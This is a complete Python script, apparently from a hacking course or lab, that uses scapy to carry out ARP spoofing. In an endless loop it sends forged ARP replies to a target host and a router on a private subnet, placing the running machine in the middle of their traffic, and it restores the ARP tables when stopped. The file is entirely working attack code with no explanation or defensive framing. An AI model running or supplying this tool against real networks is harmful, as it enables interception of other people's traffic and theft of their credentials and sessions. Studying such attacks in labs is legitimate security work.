#!/usr/bin/env python

import scapy.all as scapy
import time
import sys


def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]

    return answered_list[0][1].hwsrc


def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose=False)


def restore(dst_ip, src_ip):
    dst_mac = get_mac(dst_ip)
    src_mac = get_mac(src_ip)
    packet = scapy.ARP(op=2, pdst=dst_ip, hwdst=dst_mac, psrc=src_ip, hwsrc=src_mac)
    scapy.send(packet, count=4, verbose=False)


target_ip = "192.168.235.128"
router_ip = "192.168.235.2"

packets_sent = 0
try:
    while True:
        spoof(target_ip, router_ip)
        spoof(router_ip, target_ip)
        packets_sent += 2
        print("\r[+] Packets sent: " + str(packets_sent)),
        sys.stdout.flush()
        time.sleep(2)
except KeyboardInterrupt:
    print("\nProgram stopped")
    print("\nRestoring connections...")
    time.sleep(3)
    restore(target_ip, router_ip)
    restore(router_ip, target_ip)
    print("Connections successfully restored")
